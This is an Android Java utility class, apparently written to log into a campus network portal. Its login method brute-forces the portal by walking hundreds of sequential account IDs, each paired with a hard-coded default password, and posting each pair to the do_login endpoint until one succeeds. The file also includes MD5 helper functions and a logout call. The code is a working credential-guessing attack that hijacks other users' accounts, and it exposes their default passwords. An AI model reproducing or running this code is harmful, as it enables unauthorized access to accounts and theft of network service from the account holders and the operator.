package com.john;

import android.content.Context;
import android.net.ConnectivityManager;
import android.os.Handler;
import android.os.Message;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.regex.Pattern;

/**
 * Created by John on 16/1/6.
 */
public class LoginUtil {

    //双证 21551000-21551500 zdrjxy
    private static final int DOUBLE_RANGE_START = 21551000;

    private static final int DOUBLE_RANGE_END = 21551500;

    private static final String DOUBLE_PASS = "zdrjxy";

    //单证 nb15000-nb15500 654321
    private static final int SINGLE_RANGE_START = 15000;

    private static final int SINGLE_RANGE_END = 15500;

    private static final String SINGLE_PASS = "654321";

    private static final String URL = "http://192.0.0.6:80/cgi-bin/do_login";

    private static final String LOGOUT_URL = "http://192.0.0.6:80/cgi-bin/do_logout";

    private static java.net.URL url = null;

    private static HttpURLConnection http = null;

    //private static HashMap<String, String> result = new HashMap<String, String>();

    private static MessageDigest md5;

    private static Pattern pattern = Pattern.compile("^[\\d]+$");


    public static boolean matchs(String str) {

        return pattern.matcher(str).matches();

    }

    public static void login(Handler handler) {

        //双证
        for (int i = DOUBLE_RANGE_START; i <= DOUBLE_RANGE_END; i++) {

            boolean isOk = post(i + "", DOUBLE_PASS);

            if (isOk) {

                //System.out.println("ok");

                //result.put(i + "", DOUBLE_PASS);

                Message message = handler.obtainMessage();

                message.arg1 = 1;

                handler.sendMessage(message);

                return;

            }

        }

        //单证
        for (int j = SINGLE_RANGE_START; j <= SINGLE_RANGE_END; j++) {

            boolean isOk = post("nb" + j + "", SINGLE_PASS);

            if (isOk) {

                //System.out.println("ok");

                //result.put("nb" + j + "", SINGLE_PASS);

                if (isOk) {

                    //System.out.println("ok");

                    //result.put(i + "", DOUBLE_PASS);

                    Message message = handler.obtainMessage();

                    message.arg1 = 1;

                    handler.sendMessage(message);

                    return;

                }

            }
        }

    }

    public static boolean post(String userName, String passWord) {

        passWord = md5_1(passWord);

        // System.out.println(userName+":"+passWord);

        try {
            url = new java.net.URL(URL);
            http = (HttpURLConnection) url.openConnection();

            http.setDoInput(true);
            http.setDoOutput(true);
            http.setUseCaches(false);
            http.setConnectTimeout(50000);//设置连接超时
            http.setReadTimeout(50000);//设置读取超时
            http.setRequestMethod("POST");
            http.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            http.connect();
            String param = "username=" + userName + "&password=" + passWord + "&drop=" + 0 + "&type=1&n=100";

            OutputStreamWriter osw = new OutputStreamWriter(http.getOutputStream(), "utf-8");
            osw.write(param);
            osw.flush();
            osw.close();

            if (http.getResponseCode() == 200) {

                BufferedReader in = new BufferedReader(new InputStreamReader(http.getInputStream(), "utf-8"));

                StringBuffer result = new StringBuffer();
                String temp;
                while ((temp = in.readLine()) != null) {
                    result.append(temp);
                }
                in.close();

                //System.out.println(result.toString());

                if (matchs(result.toString())) {

                    //System.out.println(result.toString());

                    //postLogout(result.toString());

                    return true;

                }


//                switch (result.toString()) {
//                    case "non_auth_error":
////                        alert("您无须认证，可直接上网");
//
//                        //System.out.println(result.toString());
//
//                        return true;
//
//                    case "ip_exist_error":
////                        alert("您的IP尚未下线，请等待2分钟再试。");
//
//                        //System.out.println(result.toString());
//
//                        return true;
//
//                    case "online_num_error":
////                        alert("该帐号的登录人数已超过限额\n如果怀疑帐号被盗用，请联系管理员。");
//
//                        //System.out.println(result.toString());
//
//                        return true;
//
//                    default:
////                        alert("找不到认证服务器");
//
//                        break;
//                }

            }

        } catch (Exception e) {
            e.printStackTrace();
            return false;
        } finally {
            if (http != null)
                http.disconnect();
        }

        return false;

    }


    public static boolean postLogout(String uid) {

        try {
            url = new java.net.URL(LOGOUT_URL);
            http = (HttpURLConnection) url.openConnection();

            http.setDoInput(true);
            http.setDoOutput(true);
            http.setUseCaches(false);
            http.setConnectTimeout(50000);//设置连接超时
            http.setReadTimeout(50000);//设置读取超时
            http.setRequestMethod("POST");
            http.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            http.connect();
            String param = "uid=" + uid;

            OutputStreamWriter osw = new OutputStreamWriter(http.getOutputStream(), "utf-8");
            osw.write(param);
            osw.flush();
            osw.close();

            if (http.getResponseCode() == 200) {

                BufferedReader in = new BufferedReader(new InputStreamReader(http.getInputStream(), "utf-8"));

                StringBuffer result = new StringBuffer();
                String temp;
                while ((temp = in.readLine()) != null) {
                    result.append(temp);
                }
                in.close();

                switch (result.toString()) {
                    case "logout_ok":
//                        alert("您无须认证，可直接上网");

                        System.out.println(result.toString());

                        return true;

                    default:
//                        alert("找不到认证服务器");

                        break;
                }

            }

        } catch (Exception e) {
            e.printStackTrace();
            return false;
        } finally {
            if (http != null)
                http.disconnect();
        }

        return false;

    }


    public static String md5_1(String pass) {

        try {
            md5 = MessageDigest.getInstance("MD5");
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }

        //128位整数分成了16份每份8位
        byte[] digest = md5.digest(pass.getBytes());

        StringBuffer sb = new StringBuffer();

        //由于有符号位,所以要处理下
        for (int i : digest) {
            if (i < 0) {
                //二进制存的是补码
                i += 256;
            }
            if (i < 16) {
                sb.append("0");
            }
            sb.append(Integer.toHexString(i));
        }
        //取16位
        return sb.toString().substring(8, 24);
    }

    public static String md5_2(String pass) {

        try {
            md5 = MessageDigest.getInstance("MD5");
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }

        //128位整数分成了16份每份8位
        byte[] digest = md5.digest(pass.getBytes());

        StringBuffer sb = new StringBuffer();

        //由于有符号位,所以要处理下
        for (int i : digest) {
            if (i < 0) {
                //二进制存的是补码
                i = i & 0xff;
            }
            if (i < 16) {
                sb.append("0");
            }
            sb.append(Integer.toHexString(i));
        }
        //取16位
        return sb.toString().substring(8, 24);
    }

    public static String md5_3(String pass) {

        char hexDigits[] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F'};

        try {
            md5 = MessageDigest.getInstance("MD5");
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }

        //128位整数分成了16份每份8位
        byte[] digest = md5.digest(pass.getBytes());

        char c[] = new char[digest.length * 2];

        int j = 0;

        for (int i : digest) {

            c[j++] = hexDigits[i >>> 4 & 0xf];
            c[j++] = hexDigits[i & 0xf];

        }

        return new String(c);
    }


    public static boolean hasInternet(MainActivity activity) {
        boolean flag;
        if (((ConnectivityManager) activity.getSystemService(
                Context.CONNECTIVITY_SERVICE)).getActiveNetworkInfo() != null)
            flag = true;
        else
            flag = false;
        return flag;
    }

}
